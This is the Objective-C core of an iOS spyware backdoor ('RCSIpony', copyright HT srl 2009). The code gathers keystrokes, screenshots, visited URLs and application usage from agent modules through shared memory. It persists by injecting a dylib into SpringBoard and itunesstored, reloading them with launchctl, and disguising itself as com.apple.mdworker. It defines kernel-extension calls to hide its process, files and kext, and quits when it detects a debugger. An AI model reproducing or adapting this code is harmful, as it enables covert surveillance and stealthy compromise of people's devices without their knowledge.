/*
 * RCSIpony - Core
 *  pon pon
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 07/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CommonCrypto/CommonDigest.h>
#import <sys/ioctl.h>
#import <fcntl.h>
#import <semaphore.h>

#import "RCSICore.h"
#import "RCSIUtils.h"
#import "RCSICommon.h"
#import "RCSILogManager.h"
#import "RCSITaskManager.h"
#import "RCSIEncryption.h"
#import "RCSIInfoManager.h"

#import "NSString+ComparisonMethod.h"


#define VERSION             "0.9.0"

#define BDOR_DEVICE         "/dev/pfCPU"
#define MCHOOK_MAGIC        10

#define SEM_NAME            "com.apple.mdworker_executed"
#define GLOBAL_PERMISSIONS  0666
//#define DEBUG

// Used for the uspace<->kspace initialization
#define MCHOOK_INIT   _IOR( MCHOOK_MAGIC, 0, int)
// Show kext from kextstat
#define MCHOOK_SHOWK  _IO(  MCHOOK_MAGIC, 1)
// Hide kext from kextstat
#define MCHOOK_HIDEK  _IO(  MCHOOK_MAGIC, 2)
// Hide given pid
#define MCHOOK_HIDEP  _IO(  MCHOOK_MAGIC, 3)
// Hide given dir/file name
#define MCHOOK_HIDED  _IOW( MCHOOK_MAGIC, 4, char [30])

//#define DEBUG


#pragma mark -
#pragma mark Private Interface
#pragma mark -

RCSISharedMemory  *mSharedMemoryCommand;
RCSISharedMemory  *mSharedMemoryLogging;

@interface RCSICore (hidden)

//
// Create the Advisory Lock -- Not used as of now. Leaving it for future use
//
- (int)_createAdvisoryLock: (NSString *)lockFile;

//
// Remove the Advisory Lock -- Not used as of now. Leaving it for future use
//
- (int)_removeAdvisoryLock: (NSString *)lockFile;

//
// Main core routine which will receive logs from shared memory
//
- (void)_communicateWithAgents;

//
// Used for guessing all the required names (e.g. update, conf...)
//
- (void)_guessNames;

@end

#pragma mark -
#pragma mark Private Implementation
#pragma mark -

@implementation RCSICore (hidden)

- (int)_createAdvisoryLock: (NSString *)lockFile
{
  NSError *error;
  BOOL success = [@"" writeToFile: lockFile
                       atomically: NO
                         encoding: NSUnicodeStringEncoding
                            error: &error];
  
  //
  // Here we might get a privilege error in case the lock is on
  //
  if (success == YES)
    {
      NSFileHandle *lockFileHandle = [NSFileHandle fileHandleForReadingAtPath:
                                      lockFile];
#ifdef DEBUG
      infoLog(ME, @"Lock file created succesfully");
#endif
      
      if (lockFileHandle) 
        {
          int fd = [lockFileHandle fileDescriptor];
          
          if (flock(fd, LOCK_EX | LOCK_NB) != 0)
            {
#ifdef DEBUG
              errorLog(ME, @"Failed to acquire advisory lock");
#endif
              
              return -1;
            }
          else
            {
#ifdef DEBUG
              infoLog(ME, @"Advisory lock acquired correctly");
#endif
              
              return fd;
            }
        }
      else
        return -1;
    }
  else
    {
#ifdef DEBUG
      errorLog(ME, @"%@", error);
#endif
    }
  
  return -1;
}

- (int)_removeAdvisoryLock: (NSString *)aLockFile
{
  NSError *error;
  
  if (flock([self mLockFD], LOCK_UN) != 0)
    {
#ifdef DEBUG
      errorLog(ME, @"Error while removing advisory lock");
#endif
      
      return -1;
    }
  else
    {
#ifdef DEBUG
      infoLog(ME, @"Advisory lock removed correctly");
#endif
      
      BOOL success = [[NSFileManager defaultManager] removeItemAtPath: aLockFile
                                                                error: &error];
      
      if (success == NO)
        {
#ifdef DEBUG
          errorLog(ME, @"Error while deleting lock file");
#endif
          
          return -1;
        }
    }
  
  return 0;
}

- (void)_communicateWithAgents
{
  //
  // TODO: Implement a condition for stopping this while loop
  // e.g. configurationUpdate / backdoorUpgrade
  //
  int agentIndex = 0;
  int agentsCount = 8;
  
  shMemoryLog *shMemLog;
  RCSILogManager *_logManager = [RCSILogManager sharedInstance];
  
#ifdef DEBUG
  infoLog(ME, @"Starting core main thread");
#endif
  
  while (mMainLoopControlFlag != @"STOP")
    {
      NSMutableData *readData;
    
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
      readData = [mSharedMemoryLogging readMemoryFromComponent: COMP_CORE 
                                                      forAgent: 0 
                                               withCommandType: CM_LOG_DATA | CM_CREATE_LOG_HEADER | CM_CLOSE_LOG];
    
    if (readData != nil)
        {
          shMemLog = (shMemoryLog *)[readData bytes];
          
          switch (shMemLog->agentID)
            {
            case AGENT_SCREENSHOT:
              {
                NSMutableData *scrData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                                       length: shMemLog->commandDataSize];

                if (shMemLog->commandType == CM_CREATE_LOG_HEADER) 
                  {
                    if ([_logManager createLog: LOG_SNAPSHOT
                                   agentHeader: scrData
                                     withLogID: shMemLog->logID] == YES)
                      {
#ifdef DEBUG
                        debugLog(ME, @"%screenshot log 0x%x header create correctly [%ld %ld]", 
                                 shMemLog->logID, shMemLog->timestamp, shMemLog->timestamp);
#endif
                      }
                    else 
                      {
#ifdef DEBUG  
                        errorLog(ME, @"screenshot log 0x%x header creation error [%ld %ld]", 
                                 shMemLog->logID, shMemLog->timestamp, shMemLog->timestamp);
#endif
                      }
                  }
                else 
                  {
                    if ([_logManager writeDataToLog: scrData
                                           forAgent: LOG_SNAPSHOT
                                          withLogID: shMemLog->logID] == TRUE)
                      {
#ifdef DEBUG
                        debugLog(ME, @"screenshot log 0x%x logged correctly [%ld %ld]",
                                 shMemLog->logID, shMemLog->timestamp, shMemLog->timestamp);
#endif
                      }
                    else 
                      {
#ifdef DEBUG
                        errorLog(ME, @"screenshot log 0x%x logging error [%ld %ld]", 
                                 shMemLog->logID, shMemLog->timestamp, shMemLog->timestamp);
#endif
                      }

                    if (shMemLog->commandType == CM_CLOSE_LOG) 
                      {
                        if ([_logManager closeActiveLog: LOG_SNAPSHOT
                                              withLogID: shMemLog->logID] == YES)
                          {
#ifdef DEBUG
                            debugLog(ME, @"screenshot log 0x%x closed correctly [%ld %ld]", 
                                     shMemLog->logID, shMemLog->timestamp, shMemLog->timestamp);
#endif
                          }
                        else 
                          {
#ifdef DEBUG
                            errorLog(ME, @"screenshot log 0x%x close error [%ld %ld]", 
                                     shMemLog->logID, shMemLog->timestamp, shMemLog->timestamp);
#endif
                          }
                      }
                  }
                
                [scrData release];
                break;
              }  
            case AGENT_URL:
              {
                //NSString *url = [[NSString alloc] initWithCString: shMemLog->commandData];
                NSMutableData *urlData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                                       length: shMemLog->commandDataSize];
                
                if ([_logManager writeDataToLog: urlData
                                       forAgent: LOG_URL
                                      withLogID: 0] == TRUE)
                  {
#ifdef DEBUG
                    NSLog(@"%s: URL logged correctly", __FUNCTION__);
#endif
                  }
                
                [urlData release];
                break;
              }
            case AGENT_APPLICATION:
              {
                //NSString *url = [[NSString alloc] initWithCString: shMemLog->commandData];
                NSMutableData *appData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                                       length: shMemLog->commandDataSize];
                
                if ([_logManager writeDataToLog: appData
                                       forAgent: LOG_APPLICATION
                                      withLogID: 0] == TRUE)
                  {
#ifdef DEBUG
                    NSLog(@"%s: APP logged correctly", __FUNCTION__);
#endif
                  }
              
                [appData release];
                break;
              }
            case AGENT_KEYLOG:
              {
                NSMutableData *keylogData = [NSMutableData dataWithBytes: shMemLog->commandData 
                                                                  length: shMemLog->commandDataSize];
                
                if ([_logManager writeDataToLog: keylogData
                                       forAgent: LOG_KEYLOG
                                      withLogID: 0] == TRUE)
                  {
#ifdef DEBUG
                    infoLog(ME, @"keystrokes logged correctly");
#endif
                  }
                
                break;
              }
            default:
              {
#ifdef DEBUG
                errorLog(ME, @"Agent not yet implemented suckers");
#endif
                
                break;
              }
          }
          
          [readData release];
        }
      
      if (agentsCount - agentIndex == 1)
        agentIndex = 0;
      else
        agentIndex++;
      
      // getting notification for AB stuff 
      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: 0.080]]; 
      
      [innerPool release];
      
      //usleep(80000);
    }
}

- (void)_guessNames
{
#ifdef DEV_MODE
  unsigned char result[CC_MD5_DIGEST_LENGTH];
  CC_MD5(gConfAesKey, strlen(gConfAesKey), result);
  
  NSData *temp = [NSData dataWithBytes: result
                                length: CC_MD5_DIGEST_LENGTH];
#else
  NSData *temp = [NSData dataWithBytes: gConfAesKey
                                length: CC_MD5_DIGEST_LENGTH];
#endif
  
  RCSIEncryption *_encryption = [[RCSIEncryption alloc] initWithKey: temp];
  gBackdoorName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
  
  //
  // Here we should calculate the lowest scrambled name in order to obtain
  // the configuration name
  //
  gBackdoorUpdateName = [_encryption scrambleForward: gBackdoorName
                                                seed: ALPHABET_LEN / 2];
  
  if ([gBackdoorName isLessThan: gBackdoorUpdateName])
    {
      gConfigurationName = [_encryption scrambleForward: gBackdoorName
                                                   seed: 1];
    }
  else
    {
      gConfigurationName = [_encryption scrambleForward: gBackdoorUpdateName
                                                   seed: 1];
    }
  
  gConfigurationUpdateName = [_encryption scrambleForward: gConfigurationName
                                                     seed: ALPHABET_LEN / 2];
  
  gDylibName = [_encryption scrambleForward: gConfigurationName
                                       seed: 2];
}

@end

////////////////////////////////////////////////////////////////////////////

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation RCSICore

@synthesize mBackdoorFD;
@synthesize mBackdoorID;
@synthesize mLockFD;
@synthesize mBinaryName;
@synthesize mApplicationName;
@synthesize mSpoofedName;
@synthesize mMainLoopControlFlag;
@synthesize mUtil;


- (id)initWithKey: (int)aKey
 sharedMemorySize: (int)aSize
    semaphoreName: (NSString *)aSemaphoreName
{
  self = [super init];
  
  if (self != nil)
    {
      self.mBackdoorFD      = 0;
      self.mBackdoorID      = 0;
      self.mApplicationName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
      self.mBinaryName      = [[[NSBundle mainBundle] executablePath] lastPathComponent];
      self.mSpoofedName     = [[[[NSBundle mainBundle] executablePath] stringByDeletingLastPathComponent]
                               stringByAppendingPathComponent: @"Umpa Lumpa"];
      
      mSharedMemoryCommand = [[RCSISharedMemory alloc] initWithFilename: SH_COMMAND_FILENAME
                                                                   size: aSize];
      
      mSharedMemoryLogging = [[RCSISharedMemory alloc] initWithFilename: SH_LOG_FILENAME
                                                                   size: SHMEM_LOG_MAX_SIZE];
      
      //
      // Let's guess all the required names
      //
      [self _guessNames];
      
      NSString *kextPath = [[NSString alloc] initWithFormat: @"%@/%@",
                            [[NSBundle mainBundle] bundlePath],
                            @"Contents/Resources"];
      NSString *loaderPath = [[NSString alloc] initWithFormat: @"%@/%@",
                              [[NSBundle mainBundle] bundlePath],
                              @"srv.sh"];
      NSString *flagPath   = [[NSString alloc] initWithFormat: @"%@/%@",
                              [[NSBundle mainBundle] bundlePath],
                              @"mdworker.flg"];
#ifdef NOT_USED
      mUtil = [[RCSIUtils alloc] initWithBackdoorPath: [[NSBundle mainBundle] bundlePath]
                                             kextPath: [[NSBundle mainBundle] pathForResource: @"mchook"
                                                                                       ofType: @"kext"]
                                         SLIPlistPath: SLI_PLIST
                                        serviceLoader: @"srv.sh"
                                             execFlag: @"mdworker.flg"];
#else
      mUtil = [[RCSIUtils alloc] initWithBackdoorPath: [[NSBundle mainBundle] bundlePath]
                                             kextPath: kextPath
                                         SLIPlistPath: SLI_PLIST
                                        serviceLoader: loaderPath
                                             execFlag: flagPath];
#endif
      
      [kextPath release];
      [loaderPath release];
      [flagPath release];
    }
  
  return self;
}

- (void)dealloc
{
  [mSharedMemoryCommand release];
  [mSharedMemoryLogging release];
  
  [mUtil release];
  
  [mMainLoopControlFlag release];
  
  if (mBackdoorFD != 0)
    {
      close (mBackdoorFD);
    }
  
  [super dealloc];
}

- (BOOL)makeBackdoorResident
{ 
  NSString *sbPathname = @"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist";
  NSString *itPathname = @"/System/Library/LaunchDaemons/com.apple.itunesstored.plist";
  
#ifdef DEBUG
  debugLog(ME, @"makeBackdoorResident: serviceLoader (%@)", [mUtil mServiceLoaderPath]);
#endif
  
  if ([mUtil createBackdoorLoader] == NO) 
    {
#ifdef DEBUG
      errorLog(ME, @"makeBackdoorResident: an error occured while writing the serviceLoader");
#endif 
      return NO;
    }
  
  // Dylib injection
  if (injectDylib(sbPathname) == NO)
    {
#ifdef DEBUG
      errorLog(ME, @"error on dylib injection");
#endif
    }
  // Dylib injection
  if (injectDylib(itPathname) == NO)
    {
#ifdef DEBUG
      errorLog(ME, @"error on dylib injection");
#endif
    }
  else 
    {
      system("launchctl unload \"/System/Library/LaunchDaemons/com.apple.itunesstored.plist\"; launchctl load \"/System/Library/LaunchDaemons/com.apple.itunesstored.plist\"");
    }

  
  return [mUtil createLaunchAgentPlist: @"com.apple.mdworker"];
}

- (BOOL)isBackdoorAlreadyResident
{
  if ([[NSFileManager defaultManager] fileExistsAtPath: BACKDOOR_DAEMON_PLIST
                                           isDirectory: NULL])
    return YES;
  else
    return NO;
}

- (BOOL)runMeh
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  //
  // Check if the backdoor is already running
  //
  sem_t *namedSemaphore = sem_open(SEM_NAME,
                                   O_CREAT | O_EXCL,
                                   GLOBAL_PERMISSIONS,
                                   1);
  
  //
  // Get system version in global variables
  //
  getSystemVersion(&gOSMajor,
                   &gOSMinor,
                   &gOSBugFix);

#ifdef DEBUG
  NSLog(@"Found iOS ver %d.%d.%d", gOSMajor, gOSMinor, gOSBugFix);
#endif

  if (namedSemaphore == SEM_FAILED)
    {
      int err = errno;
      
      if (err == ENOENT || err == EEXIST)
        {
#ifdef DEBUG
          warnLog(ME, @"Trying to unlink semaphore since process was killed");
#endif
          if (sem_unlink(SEM_NAME) == 0)
            {
#ifdef DEBUG
              infoLog(ME, @"sem_unlink went ok");
              infoLog(ME, @"Trying to recreate the semaphore");
#endif
              namedSemaphore = sem_open(SEM_NAME,
                                        O_CREAT | O_EXCL,
                                        GLOBAL_PERMISSIONS,
                                        1);
            
              if (namedSemaphore == SEM_FAILED)
                {
#ifdef DEBUG
                  errorLog(ME, @"An error occurred while recreating semaphore after unlink");
#endif
                }
            }
          else
            {
#ifdef DEBUG
              errorLog(ME, @"An error occurred while unlinking semaphore");
#endif
            }
        }
      else
        {
#ifdef DEBUG
          errorLog(ME, @"Execution check error! Backdoor is already running");
          errorLog(ME, @"err (%d) %s", errno, strerror(errno));
#endif
      
          exit(-1);
        }
    }
  else
    {
#ifdef DEBUG
      infoLog(ME, @"Semaphore Registered correctly");
#endif
    }
    
  //
  // Create and initialize the shared memory segments
  // for commands and logs
  //
  if ([mSharedMemoryCommand createMemoryRegion] == -1)
    {
#ifdef DEBUG
      errorLog(ME, @"[CORE] There was an error while creating the Commands Shared Memory");
#endif
      return NO;
    }
  if ([mSharedMemoryCommand attachToMemoryRegion: YES] == -1)
    {
#ifdef DEBUG
      errorLog(ME, @"There was an error while attaching to the Commands Shared Memory");
#endif
      return NO;
    }
  
  [mSharedMemoryCommand zeroFillMemory];
  
  if ([mSharedMemoryLogging createMemoryRegion] == -1)
    {
#ifdef DEBUG
      errorLog(ME, @"There was an error while creating the Logging Shared Memory");
#endif
      return NO;
    }
  if ([mSharedMemoryLogging attachToMemoryRegion: YES] == -1)
    {
#ifdef DEBUG
      errorLog(ME, @"There was an error while attaching to the Logging Shared Memory");
#endif
      return NO;
    }
  
  [mSharedMemoryLogging zeroFillMemory];
  
  //if ([mApplicationName isEqualToString: mBinaryName])
    //{
      //
      // Check if there's another backdoor running
      //
    //}
  
  if ([self isBackdoorAlreadyResident] == YES)
    {
#ifdef DEBUG    
      warnLog(ME, @"Backdoor has been made already resident");
#endif  
    }
  else
    {
      if ([self makeBackdoorResident] == NO)
        {
#ifdef DEBUG
          errorLog(ME, @"[makeBackdoorResident] An error occurred");
#endif        
        }
      else
        {
#ifdef DEBUG        
          infoLog(ME, @"[makeBackdoorResident] successful");
#endif
        }
    }
  /* 
  // TODO: Check if we really need to load our kext
  [self loadKext];
  
  if ([self connectKext] != -1)
    {
      // 
      // Start hiding all the required paths
      // launchDaemonFile
      // appDroppedPath == Where we have been dropped which is different than our
      // app folder (/RCSMac.app/)
      //
      int ret;
      ret = ioctl(mBackdoorFD, MCHOOK_HIDED, (char *)[[launchDaemonPath 
                                                       lastPathComponent] fileSystemRepresentation]);
      NSString *appDroppedPath = [[[[NSBundle mainBundle] bundlePath]
                                   stringByDeletingLastPathComponent] lastPathComponent];
      ret = ioctl(mBackdoorFD, MCHOOK_HIDED, (char *)[appDroppedPath fileSystemRepresentation]);
    }
*/
  
  //
  // Get a task Manager instance (singleton) and load the configuration
  // through the confManager
  //
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
  
  //
  // Load the configuration and starts all the events monitoring routines
  // eventsMonitor detached as a separate thread
  //
#ifdef DEBUG
  infoLog(ME, @"Loading initial configuration");
#endif
  
  [taskManager loadInitialConfiguration];
  
  // Set the backdoorControlFlag to RUNNING
  mMainLoopControlFlag = @"RUNNING";
  taskManager.mBackdoorControlFlag = mMainLoopControlFlag;
  
  RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
  [infoManager logActionWithDescription: @"Start"];
  [infoManager release];

  // Main backdoor loop
  [self _communicateWithAgents];
  
  [pool release];
  
  return YES;
}

- (void)loadKext
{
  // TODO: Fix chmod/chown/kextload paths
  NSArray *arguments = [NSArray arrayWithObjects: @"-R",
                        @"744",
                        [mUtil mKextPath],
                        nil];
  [mUtil executeTask: @"/bin/chmod"
       withArguments: arguments
        waitUntilEnd: YES];
  
  arguments = [NSArray arrayWithObjects: @"-R",
               @"root:wheel",
               [mUtil mKextPath],
               nil];
  [mUtil executeTask: @"/usr/sbin/chown"
       withArguments: arguments
        waitUntilEnd: YES];
  
  arguments = [NSArray arrayWithObjects: @"-v",
               [mUtil mKextPath],
               nil];
  
  [mUtil executeTask: @"/sbin/kextload"
       withArguments: arguments
        waitUntilEnd: YES];
}

- (int)connectKext
{
#ifdef DEBUG
  infoLog(ME, @"[connectKext] Initializing backdoor");
#endif
  
  self.mBackdoorFD = open(BDOR_DEVICE, O_RDWR);
  if (mBackdoorFD != -1) {
    int ret, bID;
    
    ret = ioctl(mBackdoorFD, MCHOOK_INIT, &bID);
    if (ret < 0)
      {
#ifdef DEBUG
        errorLog(ME, @"[initBackdoor] Error while initializing the uspace-kspace"\
                  "communication channel\n");
#endif
      }
    else
      {
#ifdef DEBUG
        infoLog(ME, @"[initBackdoor] Backdoor initialized correctly\n");
#endif
        
        return bID;
      }
  }
  else
    {
#ifdef DEBUG
      errorLog(ME, @"[initBackdoor] Error while initializing backdoor");
#endif
    }
  
  return -1;
}

//
// See http://developer.apple.com/qa/qa2004/qa1361.html
//
- (void)amIBeingDebugged
{
  while (true)
    {
      int                 junk;
      int                 mib[4];
      struct kinfo_proc   info;
      size_t              size;
      
      //
      // Initialize the flags so that, if sysctl fails for some bizarre
      // reason, we get a predictable result.
      //
      info.kp_proc.p_flag = 0;
      
      //
      // Initialize mib, which tells sysctl the info we want, in this case
      // we're looking for information about a specific process ID. 
      //
      mib[0] = CTL_KERN;
      mib[1] = KERN_PROC;
      mib[2] = KERN_PROC_PID;
      mib[3] = getpid();
      
      // Call sysctl
      size = sizeof(info);
      junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
      assert(junk == 0);
      
      // We're being debugged if the P_TRACED flag is set
      if ((info.kp_proc.p_flag & P_TRACED) != 0)
        {
          exit(-1);
        }
      
      usleep(1000000);
    }
}

@end
